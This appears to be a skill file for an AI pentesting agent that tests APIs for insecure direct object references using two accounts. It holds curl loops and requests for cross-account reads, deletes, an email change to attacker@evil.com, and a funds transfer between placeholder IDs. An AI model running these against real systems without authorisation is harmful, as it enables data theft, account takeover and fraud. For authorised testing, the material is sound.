---
name: attack-idor-automation
description: Prove broken object-level authorisation by replaying one endpoint list under two accounts and diffing the responses — sequential identifiers, UUIDs captured from an earlier reply, cookie as well as bearer sessions, HTTP method switching and cross-boundary writes. Reach for it when you hold two accounts of different privilege against user-scoped API endpoints.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-idor-automation/SKILL.md
    commit: 359655518
---

# IDOR Automated Testing

## Objective

Systematically test all API endpoints for Insecure Direct Object Reference vulnerabilities using two accounts with different privilege levels.

## Testing Methodology

### Phase 1: Set Up Two Accounts

1. **Account A** (victim) — owns resources being tested
2. **Account B** (attacker) — tries to access Account A's resources

### Phase 2: Automated Cross-Account Testing

```bash
# Test endpoints from file — curl loop hitting each endpoint with both tokens
# and diffing the responses
while IFS= read -r endpoint; do
  code_a=$(curl -s -o /tmp/resp_a.json -w "%{http_code}" \
    -H "Authorization: Bearer VICTIM_JWT" "$endpoint")
  code_b=$(curl -s -o /tmp/resp_b.json -w "%{http_code}" \
    -H "Authorization: Bearer ATTACKER_JWT" "$endpoint")
  echo "$endpoint  victim=$code_a  attacker=$code_b"
  diff /tmp/resp_a.json /tmp/resp_b.json && echo "  identical response — possible IDOR"
done < endpoints.txt

# Test comma-separated endpoints
IFS=',' read -ra EPS <<< "https://TARGET/api/users/123,https://TARGET/api/orders/456,https://TARGET/api/profile/123"
for endpoint in "${EPS[@]}"; do
  curl -s -o /dev/null -w "%{http_code} $endpoint\n" \
    -X GET -H "Authorization: Bearer ATTACKER_JWT" "$endpoint"
done

# Test write operations
while IFS= read -r endpoint; do
  curl -s -X PUT -H "Authorization: Bearer ATTACKER_JWT" \
    -H "Content-Type: application/json" \
    -d '{"name":"pwned"}' "$endpoint"
done < endpoints.txt
```

### Phase 3: Manual Testing Patterns

**Horizontal IDOR (same role, different user):**
```bash
# Sequential IDs
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/1
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/2

# UUID guessing (if predictable)
curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/UUID_OF_OTHER_USER

# Endpoint enumeration
for id in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer ATTACKER_TOKEN" "https://TARGET/api/orders/$id"
done

# UUID/GUID swap — capture another user's UUID from an earlier response instead of
# guessing it, then substitute it into /api/profile/{uuid}, /api/orders/{uuid}

# Cookie-session applications: replace the bearer header with the session cookie,
# e.g. -H "Cookie: session=LOW_PRIV_SESSION"
```

**Vertical IDOR (low-priv accessing high-priv):**
```bash
# User accessing admin endpoints
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/users
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/admin/settings
curl -H "Authorization: Bearer USER_TOKEN" https://TARGET/api/internal/reports
```

### Phase 4: HTTP Method Switching

```bash
# GET blocked but DELETE works
curl -X DELETE -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID

# GET blocked but PATCH works
curl -X PATCH -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID \
  -d '{"email":"attacker@evil.com"}'

# GET blocked but POST works
curl -X POST -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID
```

### Phase 5: Parameter Pollution

```bash
# Dual ID injection
curl "https://TARGET/api/profile?user_id=ATTACKER&user_id=VICTIM"

# Body override
curl -X POST https://TARGET/api/transfer \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"from":"VICTIM_ID","to":"ATTACKER_ID","amount":1000}'

# Parameter-based IDOR — swap the object reference in the body or query string:
# user_id, account_id, order_id; and the authorisation fields role, group_id, org_id
```

### Phase 6: Response Comparison

```bash
# Compare responses between two auth contexts
diff <(curl -s -H "Authorization: Bearer VICTIM_TOKEN" "https://TARGET/api/users/VICTIM_ID") \
     <(curl -s -H "Authorization: Bearer ATTACKER_TOKEN" "https://TARGET/api/users/VICTIM_ID")
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Read other user's PII (email, SSN, etc.) | Critical (P1) |
| Modify other user's data | Critical (P1) |
| Delete other user's resources | Critical (P1) |
| Access admin functionality | Critical (P1) |
| Read non-sensitive data of other user | Medium (P3) |

## Evidence Requirements

- Two different auth tokens used
- Endpoint tested
- Account A (victim) response as baseline
- Account B (attacker) accessing Account A's resource
- Data received proving cross-account access

## Tools

- curl loop over an endpoint list with two tokens (see Phase 2) — automated cross-account testing
- `diff` on two curl responses (see Phase 6) — response comparison
- the python3 JWT-forging snippet from attack-jwt, or `jwt_tool` — token manipulation for IDOR

## References

- [OWASP: IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger: Access Control](https://portswigger.net/web-security/access-control/idor)
